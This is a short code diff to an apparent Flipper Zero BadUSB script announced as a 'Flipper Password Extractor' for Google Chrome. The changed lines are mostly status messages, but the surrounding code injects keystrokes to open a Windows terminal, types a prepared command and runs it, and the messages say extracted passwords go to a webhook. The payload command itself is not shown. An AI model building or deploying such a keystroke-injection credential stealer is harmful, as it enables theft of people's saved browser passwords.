@@ -24,6 +24,10 @@ for (let i = 0; i < script.length; i++) {
     command += script[i];
 }
 
+print("--- Flipper Password Extractor ---");
+print("(i) You are running the Google Chrome version");
+print("(i) The passwords will be sent to the webhook set in this file");
+
 print("Waiting for connection");
 while (!badusb.isConnected()) {
     delay(1000);
@@ -33,8 +37,8 @@ badusb.press("GUI", "x");
 delay(300);
 badusb.press("i");
 delay(3000);
-print("Running payload");
+print("Running payload...");
 badusb.println(command, 10);
 badusb.press("ENTER");
 badusb.quit();
-print("done :)");
+print("Done. You can now disconnect the Flipper.");
